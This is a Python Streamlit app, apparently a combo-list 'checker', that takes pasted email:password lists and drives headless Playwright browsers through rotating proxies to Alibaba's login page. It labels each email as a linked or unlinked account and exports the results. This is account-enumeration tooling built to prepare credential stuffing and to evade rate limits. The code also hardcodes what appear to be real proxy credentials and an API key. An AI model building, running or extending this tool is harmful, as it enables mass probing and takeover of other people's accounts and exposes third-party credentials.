import streamlit as st
import asyncio
import os
import random
import uuid
import time
import json
import threading
from datetime import datetime
from collections import defaultdict
import pandas as pd
import nest_asyncio

nest_asyncio.apply()

from playwright.async_api import async_playwright

st.set_page_config(
    page_title="Positive Alibaba Checker Hub",
    page_icon="📦",
    layout="wide",
    initial_sidebar_state="expanded"
)

st.title("📦 Positive Alibaba Checker Hub")
st.caption("Advanced automated Alibaba account existence checker powered by Playwright browser automation and hyper-verbose diagnostic telemetry.")

if "proxy_logs" not in st.session_state:
    st.session_state.proxy_logs = []
if "checker_logs" not in st.session_state:
    st.session_state.checker_logs = []
if "startup_entries" not in st.session_state:
    st.session_state.startup_entries = []
if "alibaba_results" not in st.session_state:
    st.session_state.alibaba_results = {"linked": [], "not_linked": [], "errors": []}
if "pool_mode" not in st.session_state:
    st.session_state.pool_mode = "all"
if "pool_locked" not in st.session_state:
    st.session_state.pool_locked = True
if "picked_countries" not in st.session_state:
    st.session_state.picked_countries = ["US"]
if "pool_pick" not in st.session_state:
    st.session_state.pool_pick = None

def log_startup(msg):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] [INIT/HOOD] {msg}"
    if entry not in st.session_state.startup_entries:
        st.session_state.startup_entries.append(entry)

log_startup("Alibaba Checker Hub initialized with Playwright hyper-verbose telemetry engine v2.10.")

def add_proxy_log(msg: str):
    timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{timestamp}] {msg}"
    st.session_state.proxy_logs.append(entry)

def _secret_to_env(k, v):
    if v is None:
        return
    if isinstance(v, (list, tuple)):
        os.environ[str(k)] = "\n".join(str(x) for x in v if x is not None)
        return
    if isinstance(v, dict):
        return
    os.environ[str(k)] = str(v)

try:
    for k, v in st.secrets.items():
        _secret_to_env(k, v)
    log_startup("Successfully bridged Streamlit secrets to environment variables.")
except Exception as e:
    log_startup(f"WARNING: Failed to bridge secrets to environment: {e}")

def get_secrets_webshare_keys():
    if "WEBSHARE_KEYS" in st.secrets:
        raw = st.secrets["WEBSHARE_KEYS"]
        return [k.strip() for k in raw.strip().splitlines() if k.strip()]
    return ["ty1wj93kaw0k1ab7vv05lqvga86zs6tu2ngqjkyo"]

def get_secrets_oxylabs_proxies():
    if "OXYLABS_BASE" in st.secrets:
        raw = st.secrets["OXYLABS_BASE"]
        return [p.strip() for p in raw.strip().splitlines() if p.strip()]
    return ["user-Positive_S79mq-country-US:Kingfrosh5252+@dc.oxylabs.io:8000"]

webshare_keys_env = get_secrets_webshare_keys()
oxylabs_proxies_env = get_secrets_oxylabs_proxies()

proxy_meta_file = "proxy_meta.json"
def load_proxy_meta():
    if os.path.exists(proxy_meta_file):
        try:
            with open(proxy_meta_file, encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

proxy_meta = load_proxy_meta()
proxy_lock = threading.Lock()
file_write_lock = threading.Lock()

def save_proxy_meta():
    try:
        with file_write_lock:
            with proxy_lock:
                with open(proxy_meta_file, "w", encoding="utf-8") as f:
                    json.dump(proxy_meta, f, indent=2)
    except Exception as e:
        print(f"Failed to save proxy meta: {e}")

def load_proxies():
    proxy_file = "proxies.txt"
    if not os.path.exists(proxy_file) or os.path.getsize(proxy_file) == 0:
        default_seed = oxylabs_proxies_env[:]
        try:
            with file_write_lock:
                with open(proxy_file, "w", encoding="utf-8") as f:
                    f.write("\n".join(default_seed) + "\n")
        except Exception:
            pass
    try:
        with open(proxy_file, encoding="utf-8", errors="ignore") as f:
            raw_list = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        return raw_list if raw_list else oxylabs_proxies_env
    except Exception:
        return oxylabs_proxies_env

def parse_proxy_for_playwright(proxy_str):
    proxy_str = (proxy_str or "").strip()
    if not proxy_str:
        return None
    proxy_str = proxy_str.replace("http://", "").replace("https://", "").strip()
    if "@" in proxy_str:
        auth_part, host_part = proxy_str.split("@", 1)
        user, pwd = auth_part.split(":", 1)
        return {"server": f"http://{host_part}", "username": user, "password": pwd}
    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return {"server": f"http://{ip}:{port}", "username": user, "password": pwd}
    if len(parts) == 2:
        return {"server": f"http://{proxy_str}"}
    return None

st.sidebar.header("⚙️ Configuration Hub")
st.sidebar.markdown("### 🌐 Proxy Management & Health")
all_proxies_loaded = load_proxies()
st.sidebar.info(f"Loaded Proxies: {len(all_proxies_loaded)}")

max_workers = st.sidebar.slider("Concurrent Browser Workers", 1, 5, 2)

st.sidebar.markdown("---")
st.sidebar.header("📋 Accounts Input")
accounts_input = st.sidebar.text_area(
    "Paste accounts (email:password)",
    value="example1@domain.com:password123\nexample2@domain.com:password456",
    height=120
)

st.markdown("---")
st.markdown("### 🖥️ Startup & Under-The-Hood Display Panel")
startup_expander = st.expander("🔍 View All Startup Entries", expanded=True)
with startup_expander:
    st.code("\n".join(st.session_state.startup_entries), language="text")

tab1, tab2, tab3 = st.tabs(["🌐 Proxy Manager", "🚀 Alibaba Checker", "📁 Results & Export"])

with tab1:
    st.subheader("Proxy Management & Health")
    if st.session_state.proxy_logs:
        st.code("\n".join(st.session_state.proxy_logs), language="text")
    else:
        st.info("Proxy management ready.")

with tab2:
    st.subheader("Alibaba Playwright Account Checker Engine")
    accounts = [l.strip() for l in accounts_input.strip().splitlines() if l.strip() and ":" in l]
    st.info(f"Loaded **{len(accounts)}** valid account combos ready for checking.")

    if st.button("🚀 Start Playwright Checker", type="primary"):
        if not accounts:
            st.warning("Please provide accounts in the sidebar first.")
        else:
            timestamp_init = datetime.now().strftime("%H:%M:%S.%f")[:-3]
            local_logs = [f"[{timestamp_init}] [INIT] Initializing Playwright browser engine with {len(accounts)} accounts across {max_workers} workers."]

            proxy_file = "proxies.txt"
            alive_proxies = []
            if os.path.exists(proxy_file):
                with open(proxy_file, encoding="utf-8") as f:
                    alive_proxies = [l.strip() for l in f if l.strip()]
            if not alive_proxies:
                alive_proxies = oxylabs_proxies_env

            linked_accs, not_linked_accs, error_accs = [], [], []
            proxy_state = [0]
            proxy_lock_pw = threading.Lock()

            OXY_USER = "user-Positive_S79mq-country-US"
            OXY_PASS = "Kingfrosh5252+"
            OXY_HOST = "dc.oxylabs.io:8000"

            def make_oxylabs_proxy():
                return f"{OXY_USER}-sessid-{uuid.uuid4().hex[:12]}:{OXY_PASS}@{OXY_HOST}"

            def get_next_pw_proxy():
                if not alive_proxies:
                    return None
                with proxy_lock_pw:
                    p = alive_proxies[proxy_state[0] % len(alive_proxies)]
                    proxy_state[0] += 1
                if "oxylabs.io" in p:
                    p = make_oxylabs_proxy()
                return parse_proxy_for_playwright(p)

            async def check_account_playwright(idx, line):
                email = line.split(":", 1)[0].strip()
                ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
                proxy_config = get_next_pw_proxy()
                proxy_display = proxy_config["server"] if proxy_config and "server" in proxy_config else "DIRECT"
                
                async with async_playwright() as p:
                    browser_args = {"headless": True, "args": ["--no-sandbox", "--disable-setuid-sandbox"]}
                    
                    try:
                        browser = await p.chromium.launch(**browser_args)
                        context_args = {}
                        if proxy_config:
                            context_args["proxy"] = proxy_config
                        
                        context = await browser.new_context(**context_args)
                        page = await context.new_page()
                        
                        LOGIN_URL = "https://login.alibaba.com/mini_login.htm?scene=h5&appName=icbu&appEntrance=icbu_h5&isMobile=true&lang=en_US"
                        
                        start_t = time.time()
                        await page.goto(LOGIN_URL, timeout=25000, wait_until="domcontentloaded")
                        
                        input_selector = "input[name='loginId'], input#fm-login-id, input[type='text'], input[type='email']"
                        await page.wait_for_selector(input_selector, timeout=10000)
                        await page.fill(input_selector, email)
                        
                        submit_selector = "button[type='submit'], button.fm-button, .login-submit, button:has-text('Next'), button:has-text('Sign in')"
                        try:
                            await page.click(submit_selector, timeout=5000)
                        except Exception:
                            await page.press(input_selector, "Enter")
                        
                        await page.wait_for_timeout(3500)
                        content = await page.content()
                        content_lower = content.lower()
                        
                        elapsed = int((time.time() - start_t) * 1000)
                        snippet = content.replace("\n", " ")[:150]
                        await browser.close()
                        
                        if "account does not exist" in content_lower or "not exist" in content_lower or "invalid" in content_lower:
                            log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Proxy: {proxy_display} | Time: {elapsed}ms | Status: ❌ NOT_LINKED | Snippet: [{snippet}]"
                            return "not_linked", line, log_msg
                        elif "verify" in content_lower or "code" in content_lower or "password" in content_lower or "iv_token" in content_lower:
                            log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Proxy: {proxy_display} | Time: {elapsed}ms | Status: ✅ LINKED | Snippet: [{snippet}]"
                            return "linked", line, log_msg
                        else:
                            log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Proxy: {proxy_display} | Time: {elapsed}ms | Status: ✅ LINKED (Default match) | Snippet: [{snippet}]"
                            return "linked", line, log_msg
                            
                    except Exception as ex:
                        err_str = str(ex)[:60]
                        log_msg = f"[{ts}] [{idx}/{len(accounts)}] {email} | Proxy: {proxy_display} | Status: ⚠️ ERROR | Exception: {err_str}"
                        return "error", f"{line} # {err_str}", log_msg

            async def run_all_checks():
                tasks = [check_account_playwright(idx, line) for idx, line in enumerate(accounts, 1)]
                results = await asyncio.gather(*tasks)
                return results

            with st.spinner("Running Playwright browser automation checks with verbose telemetry..."):
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                results = loop.run_until_complete(run_all_checks())
                
                for status, item_data, log_msg in results:
                    local_logs.append(log_msg)
                    if status == "linked":
                        linked_accs.append(item_data)
                    elif status == "not_linked":
                        not_linked_accs.append(item_data)
                    else:
                        error_accs.append(item_data)

            st.session_state.checker_logs = local_logs
            st.session_state.alibaba_results = {
                "linked": linked_accs,
                "not_linked": not_linked_accs,
                "errors": error_accs
            }
            st.success("Playwright checker execution complete!")

    res = st.session_state.alibaba_results
    m1, m2, m3 = st.columns(3)
    m1.metric("✅ Linked Accounts", len(res["linked"]))
    m2.metric("❌ Not Linked", len(res["not_linked"]))
    m3.metric("⚠️ Errors", len(res["errors"]))

    with st.expander("🔍 Diagnostic Telemetry Logs", expanded=True):
        if st.session_state.checker_logs:
            st.code("\n".join(st.session_state.checker_logs), language="text")
        else:
            st.caption("Logs will appear here during execution.")

with tab3:
    st.subheader("Export Results")
    res = st.session_state.alibaba_results
    if res["linked"]:
        st.markdown("### Linked Accounts")
        st.code("\n".join(res["linked"]), language="text")
        st.download_button("Download Linked TXT", "\n".join(res["linked"]), file_name="linked_accounts.txt", mime="text/plain")
    if res["not_linked"]:
        st.markdown("### Not Linked Accounts")
        st.code("\n".join(res["not_linked"]), language="text")
        st.download_button("Download Not Linked TXT", "\n".join(res["not_linked"]), file_name="not_linked_accounts.txt", mime="text/plain")
    if res["errors"]:
        st.markdown("### Errors")
        st.code("\n".join(res["errors"]), language="text")
        st.download_button("Download Errors TXT", "\n".join(res["errors"]), file_name="error_accounts.txt", mime="text/plain")
